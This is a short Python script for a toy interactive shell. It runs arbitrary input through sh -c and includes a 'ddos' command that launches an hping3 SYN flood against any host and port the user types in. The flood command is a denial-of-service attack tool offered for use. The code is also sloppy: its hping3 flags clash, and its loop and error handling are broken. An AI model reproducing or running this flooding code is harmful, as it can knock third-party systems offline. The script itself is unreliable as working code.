from sh import sh
from sh import ErrorReturnCode
from sh import Command as Cmd
from sh import ifconfig
from sh import hping3
from multiprocessing import Process

command_=""

def main():
    global command_
    try:
        command_ = input("r$ ")
    except EOFError as e:
        command_ = None

    if (command_):
        if command_ == "ifconfig":
            ifconfig("-a")
        elif command_.split(" ")[0] == "ddos":
            hping3("-S", "--flood", "--force-icmp", "--destport", "{}".format(command_.split(" ")[2]), command_.split(" ")[1])


        else:
            print(sh("-c",command_))
    


while True:
    try: 
        command_= main()
    except Exception as e:
        print("{}".format("rsh: error: "+command_+" not found"))
        continue
